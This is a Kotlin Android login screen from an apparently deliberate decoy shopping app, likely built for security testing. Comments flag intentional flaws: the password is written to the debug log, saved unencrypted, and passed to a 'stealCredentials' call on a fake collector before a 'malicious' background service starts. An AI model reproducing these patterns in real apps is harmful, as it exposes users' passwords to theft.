package com.decoy.shopping.agent.ui

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.decoy.shopping.agent.MainActivity
import com.decoy.shopping.agent.R
import com.decoy.shopping.agent.service.AgentService

class LoginActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        val toolbar = findViewById<androidx.appcompat.widget.Toolbar>(R.id.toolbar)
        setSupportActionBar(toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        val emailInput = findViewById<EditText>(R.id.loginEmail)
        val passwordInput = findViewById<EditText>(R.id.loginPassword)
        val loginBtn = findViewById<Button>(R.id.loginBtn)
        val toRegister = findViewById<TextView>(R.id.toRegister)

        loginBtn.setOnClickListener {
            val email = emailInput.text.toString()
            val pass = passwordInput.text.toString()

            if (email.isNotEmpty() && pass.isNotEmpty()) {
                // INTENTIONAL VULNERABILITY: Plaintext credential leak
                Log.d("AGENT_DATA", "[DATA_LEAK] User Login Attempted")
                Log.d("AGENT_DATA", "Email: $email")
                Log.d("AGENT_DATA", "Password: $pass")
                
                // MALICIOUS ACTION: Send credentials to fake collector
                com.decoy.shopping.agent.api.FakeApiClient.stealCredentials(email, pass)

                // INTENTIONAL VULNERABILITY: Save credentials in plaintext SharedPreferences
                val prefs = getSharedPreferences("decoy_prefs", MODE_PRIVATE)
                prefs.edit().putString("email", email).putString("password", pass).apply()

                // Start Malicious Background Service
                startService(Intent(this, AgentService::class.java))

                Toast.makeText(this, "Logged in as $email", Toast.LENGTH_SHORT).show()
                startActivity(Intent(this, MainActivity::class.java))
                finish()
            } else {
                Toast.makeText(this, "Credentials required", Toast.LENGTH_SHORT).show()
            }
        }

        toRegister.setOnClickListener {
            startActivity(Intent(this, RegisterActivity::class.java))
        }
    }

    override fun onOptionsItemSelected(item: android.view.MenuItem): Boolean {
        if (item.itemId == android.R.id.home) {
            finish()
            return true
        }
        return super.onOptionsItemSelected(item)
    }
}
